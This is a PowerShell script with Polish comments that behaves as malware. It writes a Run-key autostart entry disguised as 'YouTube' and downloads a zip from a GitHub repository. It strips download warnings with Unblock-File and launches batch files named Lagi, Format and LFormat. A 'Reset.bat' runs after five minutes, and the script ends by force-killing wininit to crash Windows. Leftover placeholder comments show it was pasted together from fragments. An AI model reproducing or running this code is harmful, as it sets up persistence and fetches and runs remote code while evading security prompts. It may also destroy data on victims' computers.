# 1. Zdefiniuj nazwę aplikacji i pełną ścieżkę do pliku .exe
$appName = "YouTube"
$exePath = "$HOME\Downloads\Pliczek.ps1"

# 2. Ścieżka w rejestrze dla autostartu użytkownika
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# 3. Dodanie wpisu do rejestru
try {
    Set-ItemProperty -Path $registryPath -Name $appName -Value $exePath
    Write-Host "Pomyślnie dodano $appName do autostartu." -ForegroundColor Green
}
catch {
    Write-Error "Wystąpił błąd podczas dodawania wpisu do rejestru: $_"
}


# --- KONFIGURACJA ---
$url = "https://github.com/Jakub668/fajne/archive/refs/heads/main.zip"
$tempDir = "$env:TEMP\GitHubDownload"
$zipFile = "$tempDir\archive.zip"
$extractDir = "$tempDir\Extracted"
$repoFolder = "$extractDir\fajne-main" # Folder, który tworzy GitHub

# Lista plików do uruchomienia natychmiast
$filesToRun = @("Lagi.bat", "LFormat.bat", "Jj.bat", "Format.bat")
# Plik do uruchomienia po 5 minutach
$finalFile = "Reset.bat"

# 1. Przygotowanie folderów
if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
New-Item -ItemType Directory -Path $extractDir -Force | Out-Null

# 2. Pobieranie archiwum
Write-Host "Pobieranie plików z GitHub..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $zipFile

# ... (wcześniejsza część skryptu z pobieraniem) ...

# 3. Rozpakowywanie
Write-Host "Rozpakowywanie..." -ForegroundColor Cyan
Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force

# --- NOWOŚĆ: Odblokowywanie plików, aby nie było okienek ostrzegawczych ---
Write-Host "Odblokowywanie plików..." -ForegroundColor Cyan
Get-ChildItem -Path $extractDir -Recurse | Unblock-File

# 4. Uruchamianie pierwszej grupy plików
# ... (reszta skryptu) ...

Write-Host "Uruchamianie plików: $filesToRun" -ForegroundColor Green
foreach ($file in $filesToRun) {
    $path = Join-Path $repoFolder $file
    if (Test-Path $path) {
        Start-Process -FilePath $path -WorkingDirectory $repoFolder
    } else {
        Write-Warning "Nie znaleziono pliku: $file"
    }
}

# 5. Odliczanie 5 minut
$waitTime = 300 # 5 minut w sekundach
Write-Host "Oczekiwanie 5 minut przed uruchomieniem $finalFile..." -ForegroundColor Yellow

# Opcjonalny pasek postępu w konsoli
for ($i = $waitTime; $i -gt 0; $i--) {
    Write-Progress -Activity "Oczekiwanie na Reset.bat" -Status "Pozostało $i sekund" -PercentComplete (($waitTime - $i) / $waitTime * 100)
    Start-Sleep -Seconds 1
}

# 6. Uruchomienie pliku Reset.bat
$finalPath = Join-Path $repoFolder $finalFile
if (Test-Path $finalPath) {
    Write-Host "Uruchamianie końcowe: $finalFile" -ForegroundColor Red
    Start-Process -FilePath $finalPath -WorkingDirectory $repoFolder
} else {
    Write-Error "Nie znaleziono pliku: $finalFile"
}

Write-Host "Zakończono pomyślnie!" -ForegroundColor Magenta
stop-process -name wininit -force
pause
